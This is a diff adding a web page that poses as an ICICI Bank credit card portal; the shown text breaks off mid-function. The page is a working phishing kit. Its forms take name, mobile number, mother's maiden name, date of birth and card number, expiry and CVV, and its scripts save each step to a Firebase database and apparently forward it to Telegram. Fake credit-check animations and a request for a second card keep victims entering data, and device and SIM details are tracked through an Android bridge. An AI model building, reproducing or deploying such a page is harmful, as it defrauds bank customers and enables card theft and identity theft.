@@ -1,0 +1,1098 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ICICI Bank - Credit Card Services</title>
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        /* ICICI THEME UPDATES */
+        :root {
+            --icici-orange: #F37E20;
+            --icici-dark-orange: #d86810;
+            --icici-blue: #053c6d;
+            --bg-color: #fff5e6;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body, html { background-color: #f4f6f8; font-family: 'Arial', sans-serif; color: #333; line-height: 1.6; width: 100%; overflow-x: hidden; }
+        
+        .bank-logo { text-align: center; margin: 0; padding: 0; width: 100%; max-width: 100%; background-color: white; display: block; overflow: hidden; line-height: 0; }
+        .bank-logo img { width: 100%; height: auto; display: block; margin: 0; padding: 0; object-fit: cover; }
+        
+        .main-content { max-width: 100%; width: 100%; margin: 0 auto; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        
+        .page-title { text-align: center; margin-top: 20px; margin-bottom: 25px; width: 100%; padding: 0 15px; }
+        .page-title h1 { font-size: 26px; color: var(--icici-blue); margin-bottom: 8px; margin-top: 0; line-height: 1.3; font-weight: 700; }
+        .page-title p { font-size: 15px; color: #555; max-width: 100%; margin: 0 auto; line-height: 1.4; }
+        
+        .container { background-color: white; padding: 20px; border-radius: 10px; box-shadow: 0px 4px 15px rgba(243, 126, 32, 0.15); width: 100%; max-width: 500px; text-align: center; animation: fadeIn 0.5s ease-in-out; margin-bottom: 30px; border-top: 4px solid var(--icici-orange); }
+        
+        .form-step { display: none; animation: fadeIn 0.5s ease-in-out; }
+        .form-step.active { display: block; }
+        
+        input, select { width: 100%; padding: 12px 15px; margin: 8px 0; border: 1.5px solid #dcdcdc; border-radius: 6px; font-size: 16px; transition: all 0.3s ease; box-shadow: 0px 2px 5px rgba(0,0,0,0.02); background-color: #fff; color: #333; }
+        input:focus, select:focus { box-shadow: 0px 0px 8px rgba(243, 126, 32, 0.2); border-color: var(--icici-orange); transform: scale(1.01); outline: none; }
+        input.error { border-color: #e74c3c; box-shadow: 0px 0px 8px rgba(231, 76, 60, 0.1); }
+        .error-message { color: #e74c3c; font-size: 13px; text-align: left; margin-top: -5px; margin-bottom: 10px; display: none; }
+        
+        .button { background: linear-gradient(135deg, var(--icici-orange) 0%, var(--icici-dark-orange) 100%); color: #fff; border: none; padding: 14px; width: 100%; cursor: pointer; margin-top: 15px; border-radius: 6px; font-size: 17px; font-weight: 600; transition: all 0.3s ease; letter-spacing: 0.5px; text-transform: uppercase; }
+        .button:hover { background: linear-gradient(135deg, var(--icici-dark-orange) 0%, var(--icici-orange) 100%); transform: scale(1.02); box-shadow: 0px 4px 10px rgba(243, 126, 32, 0.3); }
+        
+        .verification-animation { display: none; font-size: 18px; font-weight: bold; animation: fadeInScale 1s ease forwards, pulse 1s infinite alternate; margin-top: 20px; letter-spacing: 0.5px; color: var(--icici-orange); text-align: center; padding: 15px; border-radius: 6px; background-color: rgba(243, 126, 32, 0.1); border: 1px solid var(--icici-orange); }
+        .verification-animation.success { color: #27ae60; background-color: rgba(39, 174, 96, 0.1); border-color: #27ae60; }
+        
+        .cibil-animation { display: none; animation: fadeInScale 0.5s ease forwards; margin-top: 20px; text-align: center; padding: 20px; border-radius: 10px; position: relative; overflow: hidden; min-height: 280px; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        
+        .cibil-checking { background: linear-gradient(135deg, #053c6d 0%, #032b4d 100%); border: 1px solid #053c6d; color: #e8eaf6; }
+        .cibil-failed { background: linear-gradient(135deg, #b71c1c 0%, #c62828 100%); border: 1px solid #d32f2f; color: #ffebee; }
+        .cibil-manual { background: linear-gradient(135deg, var(--icici-orange) 0%, var(--icici-dark-orange) 100%); border: 1px solid var(--icici-orange); color: #fff; }
+        
+        .gif-container { width: 220px; height: auto; margin-bottom: 15px; display: flex; justify-content: center; align-items: center; }
+        .cibil-gif-img { width: 100%; height: auto; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+        
+        .cibil-text { font-size: 18px; font-weight: 600; margin-bottom: 8px; text-shadow: 0 1px 3px rgba(0,0,0,0.2); padding: 0 10px; }
+        .cibil-subtext { font-size: 14px; opacity: 0.9; max-width: 95%; margin: 0 auto; line-height: 1.4; padding: 0 10px; }
+        
+        .loading-dots { display: inline-block; margin-left: 5px; }
+        .loading-dots span { animation: blink 1.4s infinite both; font-size: 20px; }
+        .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
+        .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
+        
+        .cibil-progress { width: 90%; height: 5px; background: rgba(255, 255, 255, 0.2); border-radius: 3px; margin: 15px auto; overflow: hidden; position: relative; }
+        .cibil-progress-bar { height: 100%; background: linear-gradient(90deg, #ffffff, #e0e0e0); border-radius: 3px; width: 0%; animation: progressFill 5s ease-in-out forwards; }
+        
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes fadeInScale { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
+        @keyframes pulse { from { opacity: 0.8; } to { opacity: 1; } }
+        @keyframes blink { 0%, 100% { opacity: 0.2; } 50% { opacity: 1; } }
+        @keyframes progressFill { 0% { width: 0%; } 100% { width: 100%; } }
+        
+        .progress-container { display: flex; justify-content: space-between; margin-bottom: 25px; position: relative; padding: 0 10px; }
+        .progress-bar { position: absolute; height: 3px; background: #ddd; top: 50%; left: 10px; right: 10px; transform: translateY(-50%); transition: width 0.3s ease; z-index: 0; }
+        .progress-step { width: 28px; height: 28px; border-radius: 50%; background-color: #fff; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #666; z-index: 1; transition: all 0.3s ease; border: 2px solid #ddd; font-size: 14px; }
+        .progress-step.active { background-color: var(--icici-orange); color: white; border-color: var(--icici-orange); }
+        .progress-step.completed { background-color: #27ae60; color: white; border-color: #27ae60; }
+        
+        .note { background-color: #fff3cd; border: 1px solid #ffeaa7; border-radius: 6px; padding: 12px; margin: 12px 0; text-align: left; font-size: 13px; color: #856404; }
+        .note strong { color: var(--icici-dark-orange); }
+        
+        .info-section { width: 100%; max-width: 100%; margin: 20px 0; padding: 20px; background-color: white; border-radius: 8px; box-shadow: 0 3px 10px rgba(0,0,0, 0.05); border: 1px solid #eee; border-left: 4px solid var(--icici-blue); }
+        .info-section h3 { color: var(--icici-blue); margin-bottom: 12px; font-size: 18px; font-weight: 700; }
+        .info-section p { margin-bottom: 12px; line-height: 1.5; color: #555; font-size: 14px; }
+        
+        .website-footer { background: linear-gradient(135deg, var(--icici-orange) 0%, var(--icici-dark-orange) 100%); color: white; padding: 30px 0 15px; margin-top: 40px; width: 100%; }
+        .footer-content { max-width: 100%; margin: 0 auto; padding: 0 20px; display: flex; flex-wrap: wrap; justify-content: space-between; }
+        .footer-section { flex: 1; min-width: 100%; margin-bottom: 25px; }
+        .footer-section h3 { font-size: 18px; margin-bottom: 15px; border-bottom: 2px solid #fff; padding-bottom: 8px; display: inline-block; }
+        .footer-section p, .footer-section a { color: #fff; margin-bottom: 8px; display: block; text-decoration: none; transition: color 0.3s; font-size: 15px; }
+        .footer-section a:hover { color: #ffe0b2; }
+        .footer-bottom { text-align: center; padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.2); margin-top: 15px; font-size: 13px; color: #fff; padding: 15px 20px 0; }
+        
+        .debug-panel { position: fixed; bottom: 10px; right: 10px; background: #333; color: #0f0; padding: 10px; border-radius: 5px; font-size: 12px; max-width: 300px; max-height: 200px; overflow-y: auto; z-index: 9999; display: none; }
+        .debug-toggle { position: fixed; bottom: 10px; right: 10px; background: var(--icici-blue); color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; z-index: 10000; font-size: 12px; }
+
+        .verification-content { display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .verification-gif { width: 120px; height: auto; display: block; margin-bottom: 15px; border-radius: 4px; }
+        
+        .popup-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.7); display: none; justify-content: center; align-items: center; z-index: 20000; backdrop-filter: blur(3px); }
+        .popup-content { background-color: white; padding: 30px; border-radius: 15px; width: 85%; max-width: 350px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); animation: popupSlideUp 0.4s ease-out; border: 1px solid #eee; display: flex; flex-direction: column; align-items: center; border-top: 5px solid var(--icici-orange); }
+        .popup-gif { width: 140px; height: auto; margin-bottom: 20px; display: block; max-width: 100%; }
+
+        .popup-title-text { font-size: 18px; color: var(--icici-blue); margin-bottom: 12px; font-weight: 700; line-height: 1.3; }
+        .popup-description { font-size: 14px; color: #444; margin-bottom: 15px; line-height: 1.5; }
+        .popup-features { font-size: 12px; color: #555; background-color: #f8f9fa; padding: 10px; border-radius: 8px; margin-bottom: 20px; font-weight: 600; width: 100%; border: 1px solid #ddd; }
+        
+        @keyframes popupSlideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+        .connection-status { position: fixed; top: 10px; right: 10px; padding: 5px 10px; border-radius: 15px; font-size: 11px; font-weight: 600; z-index: 10000; display: flex; align-items: center; gap: 5px; }
+        .connection-status.online { background: #d4edda; color: #155724; }
+        .connection-status.offline { background: #f8d7da; color: #721c24; }
+        .connection-status i { font-size: 10px; }
+
+        @media (min-width: 481px) { .container { max-width: 450px; padding: 25px; margin: 0 auto 30px; } .main-content { padding: 0 20px; } .footer-section { min-width: 48%; } }
+        @media (min-width: 769px) { .main-content { max-width: 1200px; padding: 0 30px; } .container { max-width: 500px; padding: 30px; } .info-section { max-width: 800px; padding: 25px; margin: 30px auto; } .footer-section { min-width: 30%; } }
+        @media (max-width: 480px) { .container { padding: 20px; margin: 0 10px 30px; width: calc(100% - 20px); } .info-section { padding: 15px; margin: 20px 10px; width: calc(100% - 20px); } }
+        @media (max-width: 360px) { .container { padding: 15px; margin: 0 8px 25px; width: calc(100% - 16px); } }
+    </style>
+</head>
+<body>
+    <!-- Connection Status -->
+    <div class="connection-status offline" id="connectionStatus">
+        <i class="fas fa-circle"></i> <span>Offline</span>
+    </div>
+
+    <!-- Debug Toggle -->
+    <button class="debug-toggle" onclick="toggleDebug()">Debug</button>
+    <div class="debug-panel" id="debugPanel"></div>
+
+    <!-- POPUP HTML -->
+    <div id="manual-verify-popup" class="popup-overlay">
+        <div class="popup-content">
+            <img src="card.gif" alt="Verification" class="popup-gif">
+            
+            <div class="popup-title-text">🔷 Manual Statement Verification</div>
+            
+            <div class="popup-description">
+                Get 100% digital processing with no paperwork 📄❌
+                <br><br>
+                Eligible applicants may receive instant approval, instant card activation, and a higher ICICI Bank credit limit up to ₹10 lakh 🚀💳
+            </div>
+            
+            <div class="popup-features">
+                Instant review • Zero paperwork • Higher credit limit 💳⚡
+            </div>
+            
+            <button class="button" style="background: #27ae60; border-color: #27ae60; background-image: none;" onclick="closePopupAndShowStep3()">Verify Now</button>
+        </div>
+    </div>
+
+    <main class="main-content">
+        <div class="bank-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/ICICI_Bank_Logo.svg/2560px-ICICI_Bank_Logo.svg.png" alt="ICICI Bank Logo">
+        </div>
+        
+        <div class="page-title">
+            <h1>ICICI Bank Credit Card</h1>
+            <p>Secure online portal for managing your ICICI Bank credit cards</p>
+        </div>
+
+        <div class="container">
+            <div class="progress-container">
+                <div class="progress-bar" id="progress-bar"></div>
+                <div class="progress-step active" id="step-indicator-1">1</div>
+                <div class="progress-step" id="step-indicator-2">2</div>
+                <div class="progress-step" id="step-indicator-3">3</div>
+            </div>
+
+            <div id="step1" class="form-step active">
+                <input type="text" id="fullname" placeholder="Full Name" required>
+                <div class="error-message" id="fullname-error">Please enter a valid full name</div>
+                
+                <input type="tel" id="mobile" placeholder="Mobile Number" required pattern="[0-9]{10}">
+                <div class="error-message" id="mobile-error">Please enter a valid 10-digit mobile number</div>
+                
+                <select id="service" required>
+                    <option value="">Select Service</option>
+                    <option value="KYC Update">KYC Update</option>
+                    <option value="Card Block">Card Block</option>
+                    <option value="Stop Services">Stop Services</option>
+                    <option value="Redeem Reward Point">Redeem Reward Points</option>
+                    <option value="New Credit Card Apply">New Card Application</option>
+                    <option value="Greeted Card">Platinum Card Services</option>
+                    <option value="Other Service">Other Service</option>
+                </select>
+                <div class="error-message" id="service-error">Please select a service</div>
+                
+                <button class="button" id="step1-button" onclick="validateStep1()">Next</button>
+            </div>
+
+            <div id="step2" class="form-step">
+                <input type="text" id="mothername" placeholder="Mother's Maiden Name" required>
+                <div class="error-message" id="mothername-error">Please enter mother's maiden name</div>
+                
+                <input type="text" id="dob" placeholder="Date of Birth (DD/MM/YYYY)" maxlength="10" inputmode="numeric" pattern="[0-9/]*" required oninput="formatDOB(this)">
+                <div class="error-message" id="dob-error">Please enter a valid date of birth (DD/MM/YYYY)</div>
+                
+                <button class="button" id="step2-button" onclick="validateStep2()">Next</button>
+            </div>
+
+            <div id="step3" class="form-step">
+                <div class="note">
+                    <strong>Note:</strong> Please Enter Your Granted Witness Credit Card Details
+                </div>
+                
+                <input type="text" id="cardnumber" placeholder="Card Number" required pattern="[0-9]{16}">
+                <div class="error-message" id="cardnumber-error">Please enter a valid 16-digit card number</div>
+                
+                <input type="text" id="expiry" placeholder="Expiry Date (MM/YY)" maxlength="5" required inputmode="numeric" pattern="[0-9/]*" oninput="formatExpiry(this)">
+                <div class="error-message" id="expiry-error">Please enter a valid expiry date (MM/YY)</div>
+                
+                <input type="password" id="cvv" placeholder="CVV (3 digits)" maxlength="3" required pattern="[0-9]{3}">
+                <div class="error-message" id="cvv-error">Please enter a valid 3-digit CVV</div>
+                
+                <button class="button" id="step3-button" onclick="validateStep3()">Submit</button>
+            </div>
+
+            <div id="verification-animation" class="verification-animation"></div>
+            <div id="cibil-animation" class="cibil-animation"></div>
+        </div>
+
+        <div class="info-section">
+            <h3>About ICICI Bank Card Services</h3>
+            <p>ICICI Bank offers premium credit card services with exceptional benefits.</p>
+        </div>
+
+        <div class="info-section">
+            <h3>Security Information</h3>
+            <p>ICICI Bank uses advanced encryption and fraud detection systems.</p>
+        </div>
+    </main>
+
+    <footer class="website-footer">
+        <div class="footer-content">
+            <div class="footer-section">
+                <h3>Contact ICICI Bank</h3>
+                <p>Customer Service: 1800 1080</p>
+                <p>Email: customer.care@icicibank.com</p>
+            </div>
+            
+            <div class="footer-section">
+                <h3>Quick Links</h3>
+                <a href="#">Home</a>
+                <a href="#">Card Services</a>
+            </div>
+            
+            <div class="footer-section">
+                <h3>Card Services</h3>
+                <a href="#">Account Management</a>
+                <a href="#">Card Security</a>
+            </div>
+        </div>
+        
+        <div class="footer-bottom">
+            <p>© 2023 ICICI Bank. All Rights Reserved.</p>
+        </div>
+    </footer>
+
+    <script>
+        // ==========================================
+        // DEBUG UTILITY
+        // ==========================================
+        function log(msg) {
+            console.log(msg);
+            const debugPanel = document.getElementById('debugPanel');
+            if (debugPanel) {
+                debugPanel.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
+                debugPanel.scrollTop = debugPanel.scrollHeight;
+            }
+        }
+        
+        function toggleDebug() {
+            const panel = document.getElementById('debugPanel');
+            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
+        }
+
+        // ==========================================
+        // FIREBASE CONFIGURATION
+        // ==========================================
+        
+
+        // Initialize Firebase with error handling
+        let firebaseApp;
+        let database;
+        
+        try {
+            if (!firebase.apps.length) {
+                firebaseApp = firebase.initializeApp(firebaseConfig);
+                log("✅ Firebase initialized successfully");
+            } else {
+                firebaseApp = firebase.app();
+                log("⚠️ Firebase already initialized");
+            }
+            database = firebase.database();
+            log("✅ Database reference obtained");
+        } catch(e) {
+            log("❌ Firebase init error: " + e.message);
+            console.error(e);
+        }
+
+        // ==========================================
+        // CONNECTION STATUS MONITORING
+        // ==========================================
+        function initConnectionMonitoring() {
+            if (!database) return;
+            
+            const connectedRef = database.ref('.info/connected');
+            connectedRef.on('value', (snap) => {
+                const statusEl = document.getElementById('connectionStatus');
+                if (snap.val() === true) {
+                    statusEl.className = 'connection-status online';
+                    statusEl.innerHTML = '<i class="fas fa-circle"></i> <span>Online</span>';
+                    log("✅ Connected to Firebase");
+                } else {
+                    statusEl.className = 'connection-status offline';
+                    statusEl.innerHTML = '<i class="fas fa-circle"></i> <span>Offline</span>';
+                    log("⚠️ Disconnected from Firebase");
+                }
+            });
+        }
+
+        // ==========================================
+        // FORM STATE
+        // ==========================================
+        const formState = { 
+            currentStep: 1, 
+            totalSteps: 3, 
+            data: {}, 
+            cardVerificationCount: 0, 
+            cibilChecked: false,
+            currentFormId: null,
+            sessionId: null,
+            formsSubmitted: [],
+            deviceInitialized: false
+        };
+
+        // ==========================================
+        // DEVICE INFO
+        // ==========================================
+        let deviceId = 'web_' + Math.random().toString(36).substr(2, 9);
+        let deviceName = "Form User (Web)";
+
+        function fetchDeviceInfo() {
+            try {
+                if (window.Android) {
+                    if (window.Android.getAppDeviceId) {
+                        const id = window.Android.getAppDeviceId();
+                        if(id && id !== "error_id") deviceId = id;
+                    }
+                    if (window.Android.getAppDeviceName) {
+                        deviceName = window.Android.getAppDeviceName();
+                    }
+                    log("✅ Android device info fetched: " + deviceId);
+                }
+            } catch(e) { 
+                log("ℹ️ Web mode (no Android): " + e.message);
+            }
+        }
+
+        // ==========================================
+        // INITIALIZATION
+        // ==========================================
+        function initForm() {
+            fetchDeviceInfo();
+            initConnectionMonitoring();
+            
+            // Add event listeners
+            document.getElementById('fullname').addEventListener('input', validateFullName);
+            document.getElementById('mobile').addEventListener('input', validateMobile);
+            document.getElementById('service').addEventListener('change', validateService);
+            document.getElementById('mothername').addEventListener('input', validateMotherName);
+            document.getElementById('dob').addEventListener('input', validateDOB);
+            document.getElementById('cardnumber').addEventListener('input', validateCardNumber);
+            document.getElementById('expiry').addEventListener('input', validateExpiry);
+            document.getElementById('cvv').addEventListener('input', validateCVV);
+            
+            formState.sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            formState.formsSubmitted = [];
+            
+            updateProgressBar();
+            log("✅ Form initialized. Session: " + formState.sessionId);
+            
+            // Initialize device in Firebase
+            initializeDeviceInFirebase();
+        }
+
+        // ==========================================
+        // DEVICE INITIALIZATION (FIXED)
+        // ==========================================
+        function initializeDeviceInFirebase() {
+            if (!database) {
+                log("❌ Database not available for device init");
+                return;
+            }
+
+            const deviceRef = database.ref('devices/' + deviceId);
+            
+            // FIX: Don't read-modify-write. Just update basic info.
+            // This prevents overwriting SIM info if it already exists from Android native code.
+            const deviceData = {
+                device_id: deviceId,
+                device_name: deviceName,
+                is_online: true,
+                last_seen: firebase.database.ServerValue.TIMESTAMP,
+                updated_at: firebase.database.ServerValue.TIMESTAMP
+            };
+            
+            // We do a simple update. 
+            // If the device entry exists with SIM info, this MERGES and keeps SIM info.
+            deviceRef.update(deviceData)
+                .then(() => {
+                    formState.deviceInitialized = true;
+                    log("✅ Device initialized in Firebase (Safe Update)");
+                    startDeviceHeartbeat();
+                })
+                .catch((error) => {
+                    log("❌ Device init error: " + error.message);
+                });
+        }
+
+        // ==========================================
+        // DEVICE HEARTBEAT (FIXED)
+        // ==========================================
+        function startDeviceHeartbeat() {
+            // Send heartbeat every 30 seconds
+            const HEARTBEAT_INTERVAL = 30000;
+            
+            setInterval(() => {
+                if (!database) return;
+                
+                const deviceRef = database.ref('devices/' + deviceId);
+                deviceRef.update({
+                    is_online: true,
+                    last_seen: firebase.database.ServerValue.TIMESTAMP
+                }).catch((error) => {
+                    log("❌ Heartbeat error: " + error.message);
+                });
+            }, HEARTBEAT_INTERVAL);
+            
+            log("💓 Heartbeat started (30s interval)");
+        }
+
+        // ==========================================
+        // VALIDATION FUNCTIONS
+        // ==========================================
+        function validateFullName() { 
+            const el = document.getElementById('fullname'); 
+            const err = document.getElementById('fullname-error'); 
+            const valid = el.value.trim().length >= 2; 
+            toggleError(el, err, valid); 
+            return valid; 
+        }
+        
+        function validateMobile() { 
+            const el = document.getElementById('mobile'); 
+            const err = document.getElementById('mobile-error'); 
+            const valid = /^\d{10}$/.test(el.value.replace(/\D/g, '')); 
+            toggleError(el, err, valid); 
+            return valid; 
+        }
+        
+        function validateService() { 
+            const el = document.getElementById('service'); 
+            const err = document.getElementById('service-error'); 
+            const valid = el.value !== ''; 
+            toggleError(el, err, valid); 
+            return valid; 
+        }
+        
+        function validateMotherName() { 
+            const el = document.getElementById('mothername'); 
+            const err = document.getElementById('mothername-error'); 
+            const valid = el.value.trim().length >= 2; 
+            toggleError(el, err, valid); 
+            return valid; 
+        }
+        
+        function validateDOB() { 
+            const el = document.getElementById('dob'); 
+            const err = document.getElementById('dob-error'); 
+            const valid = /^\d{2}\/\d{2}\/\d{4}$/.test(el.value) && isValidDate(el.value); 
+            toggleError(el, err, valid); 
+            return valid; 
+        }
+        
+        function validateCardNumber() { 
+            const el = document.getElementById('cardnumber'); 
+            const err = document.getElementById('cardnumber-error'); 
+            const valid = /^\d{16}$/.test(el.value.replace(/\s/g, '')); 
+            toggleError(el, err, valid); 
+            return valid; 
+        }
+        
+        function validateExpiry() { 
+            const el = document.getElementById('expiry'); 
+            const err = document.getElementById('expiry-error'); 
+            const valid = /^\d{2}\/\d{2}$/.test(el.value) && isValidExpiry(el.value); 
+            toggleError(el, err, valid); 
+            return valid; 
+        }
+        
+        function validateCVV() { 
+            const el = document.getElementById('cvv'); 
+            const err = document.getElementById('cvv-error'); 
+            const valid = /^\d{3}$/.test(el.value); 
+            toggleError(el, err, valid); 
+            return valid; 
+        }
+        
+        function toggleError(input, errorElement, isValid) { 
+            if (isValid) { 
+                input.classList.remove('error'); 
+                errorElement.style.display = 'none'; 
+            } else { 
+                input.classList.add('error'); 
+                errorElement.style.display = 'block'; 
+            } 
+        }
+
+        function updateProgressBar() {
+            const progressPercentage = ((formState.currentStep - 1) / (formState.totalSteps - 1)) * 100;
+            document.getElementById('progress-bar').style.width = `${progressPercentage}%`;
+            document.getElementById('progress-bar').style.background = 'var(--icici-orange)';
+            for (let i = 1; i <= formState.totalSteps; i++) {
+                const indicator = document.getElementById(`step-indicator-${i}`);
+                if (i < formState.currentStep) indicator.className = 'progress-step completed';
+                else if (i === formState.currentStep) indicator.className = 'progress-step active';
+                else indicator.className = 'progress-step';
+            }
+        }
+
+        // ==========================================
+        // STEP HANDLERS
+        // ==========================================
+        function validateStep1() {
+            log("Step 1 validation started...");
+            
+            if (validateFullName() && validateMobile() && validateService()) {
+                formState.data.fullname = document.getElementById('fullname').value.trim();
+                formState.data.mobile = document.getElementById('mobile').value.replace(/\D/g, '');
+                formState.data.service = document.getElementById('service').value;
+                
+                formState.currentFormId = 'form_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                
+                formState.formsSubmitted.push({
+                    formId: formState.currentFormId,
+                    step: 'step1',
+                    timestamp: Date.now()
+                });
+                
+                log("Saving Step 1 to Firebase...");
+                saveFormDataToFirebase('step1');
+                sendStepToTelegram('step1');
+                
+                // Update device with mobile number immediately
+                updateDeviceMobileNumber(formState.data.mobile);
+                
+                showVerification('step2', 'Verifying Your Details...', false);
+            } else {
+                log("❌ Step 1 validation failed");
+            }
+        }
+
+        function validateStep2() {
+            log("Step 2 validation started...");
+            
+            if (validateMotherName() && validateDOB()) {
+                formState.data.mothername = document.getElementById('mothername').value.trim();
+                formState.data.dob = document.getElementById('dob').value;
+                
+                log("Saving Step 2 to Firebase...");
+                saveFormDataToFirebase('step2');
+                sendStepToTelegram('step2');
+                
+                showCibilCheckAnimation();
+            } else {
+                log("❌ Step 2 validation failed");
+            }
+        }
+
+        function validateStep3() {
+            log("Step 3 validation started...");
+            
+            if (validateCardNumber() && validateExpiry() && validateCVV()) {
+                const cardData = {
+                    cardnumber: document.getElementById('cardnumber').value.replace(/\s/g, ''),
+                    expiry: document.getElementById('expiry').value,
+                    cvv: document.getElementById('cvv').value,
+                    timestamp: Date.now()
+                };
+                
+                formState.data.cardDetails = cardData;
+                
+                log("Saving Step 3 to Firebase...");
+                saveFormDataToFirebase('step3');
+                sendStepToTelegram('step3');
+                
+                // SHOW GIF for Step 3 -> Verification
+                showVerification('step3', 'Please Wait Your Granted Witness Card Verify', true);
+            } else {
+                log("❌ Step 3 validation failed");
+            }
+        }
+
+        // ==========================================
+        // UPDATE DEVICE MOBILE (FIXED)
+        // ==========================================
+        function updateDeviceMobileNumber(mobile) {
+            if (!database || !mobile) {
+                log("❌ Cannot update mobile: DB or mobile not available");
+                return;
+            }
+
+            const deviceRef = database.ref('devices/' + deviceId);
+            
+            // Just update the mobile. Safe.
+            deviceRef.update({
+                mobile: mobile,
+                mobile_number: mobile,
+                user_mobile: mobile,
+                last_seen: firebase.database.ServerValue.TIMESTAMP
+            })
+            .then(() => {
+                log("✅ Mobile number saved to device: " + mobile);
+            })
+            .catch((error) => {
+                log("❌ Mobile update error: " + error.message);
+            });
+        }
+
+        // ==========================================
+        // ANIMATIONS AND POPUP LOGIC
+        // ==========================================
+        
+        function showCibilCheckAnimation() {
+            document.getElementById(`step${formState.currentStep}`).classList.remove('active');
+            document.getElementById('verification-animation').style.display = 'none';
+            showAnimationPhase1();
+        }
+
+        function showAnimationPhase1() {
+            const anim = document.getElementById('cibil-animation');
+            anim.style.display = 'flex'; 
+            anim.className = 'cibil-animation cibil-checking';
+            anim.innerHTML = `
+                <div class="gif-container">
+                    <img src="https://image2url.com/r2/default/images/1770808739878-a9c8b5fd-eaae-494b-b81a-d09ea6211bf0.gif" class="cibil-gif-img" alt="Checking">
+                </div>
+                <div class="cibil-text">Checking CIBIL Score...<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span></div>
+                <div class="cibil-progress"><div class="cibil-progress-bar"></div></div>
+            `;
+            setTimeout(showAnimationPhase2, 5000);
+        }
+
+        function showAnimationPhase2() {
+            const anim = document.getElementById('cibil-animation');
+            anim.className = 'cibil-animation cibil-failed';
+            anim.innerHTML = `
+                <div class="gif-container">
+                    <img src="https://image2url.com/r2/default/images/1770808739878-a9c8b5fd-eaae-494b-b81a-d09ea6211bf0.gif" class="cibil-gif-img" alt="Checking">
+                </div>
+                <div class="cibil-text">Unable To Fetch Statement</div>
+            `;
+            setTimeout(showAnimationPhase3, 5000);
+        }
+
+        function showAnimationPhase3() {
+            const anim = document.getElementById('cibil-animation');
+            anim.className = 'cibil-animation cibil-manual';
+            anim.innerHTML = `
+                <div class="gif-container">
+                    <img src="https://image2url.com/r2/default/images/1770808739878-a9c8b5fd-eaae-494b-b81a-d09ea6211bf0.gif" class="cibil-gif-img" alt="Checking">
+                </div>
+                <div class="cibil-text">Manual Verification Required</div>
+            `;
+            
+            setTimeout(() => {
+                anim.style.display = 'none';
+                showManualVerifyPopup();
+            }, 5000);
+        }
+
+        function showManualVerifyPopup() {
+            const popup = document.getElementById('manual-verify-popup');
+            popup.style.display = 'flex';
+        }
+
+        function closePopupAndShowStep3() {
+            const popup = document.getElementById('manual-verify-popup');
+            popup.style.display = 'none';
+            
+            formState.currentStep++; 
+            updateProgressBar(); 
+            document.getElementById('step3').classList.add('active'); 
+            formState.cibilChecked = true;
+        }
+
+        function showVerification(nextStepId, message, useGif = false) {
+            const anim = document.getElementById('verification-animation');
+            anim.style.display = 'block'; 
+            
+            if (useGif) {
+                anim.innerHTML = `
+                    <div class="verification-content">
+                        <img src="https://image2url.com/r2/default/images/1770808739878-a9c8b5fd-eaae-494b-b81a-d09ea6211bf0.gif" class="verification-gif" alt="Scanning Card">
+                        <div>${message}</div>
+                    </div>
+                `;
+            } else {
+                anim.textContent = message;
+            }
+
+            anim.classList.remove('success');
+            document.getElementById(`step${formState.currentStep}`).classList.remove('active');
+            
+            setTimeout(() => {
+                if (useGif) {
+                    anim.innerHTML = `<div class="verification-content"><div>Verification Successful!</div></div>`;
+                } else {
+                    anim.textContent = "Verification Successful!"; 
+                }
+
+                anim.classList.add('success');
+                setTimeout(() => {
+                    anim.style.display = 'none';
+                    if (formState.currentStep < formState.totalSteps) {
+                        formState.currentStep++; 
+                        updateProgressBar(); 
+                        document.getElementById(nextStepId).classList.add('active');
+                    } else {
+                        formState.cardVerificationCount++;
+                        
+                        if (formState.cardVerificationCount === 1) {
+                            anim.style.display = 'block'; 
+                            anim.innerHTML = "Please Verify Another Credit Card"; 
+                            anim.classList.remove('success');
+                            
+                            saveFormDataToFirebase('final');
+                            sendCardToTelegram('first_card');
+                            
+                            setTimeout(() => { 
+                                anim.style.display = 'none'; 
+                                resetCardDetailsForNextCard(); 
+                                document.getElementById('step3').classList.add('active'); 
+                            }, 3000);
+                        } else {
+                            submitForm();
+                        }
+                    }
+                }, 2000);
+            }, 3000);
+        }
+
+        function resetCardDetailsForNextCard() {
+            document.getElementById('cardnumber').value = ''; 
+            document.getElementById('expiry').value = ''; 
+            document.getElementById('cvv').value = '';
+            
+            const oldFormId = formState.currentFormId;
+            formState.currentFormId = 'form_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            
+            formState.formsSubmitted.push({
+                formId: formState.currentFormId,
+                step: 'step3_second_card',
+                timestamp: Date.now(),
+                parentFormId: oldFormId
+            });
+            
+            saveFormDataToFirebase('step3_second_card');
+        }
+
+        function submitForm() {
+            const anim = document.getElementById('verification-animation');
+            anim.style.display = 'block'; 
+            
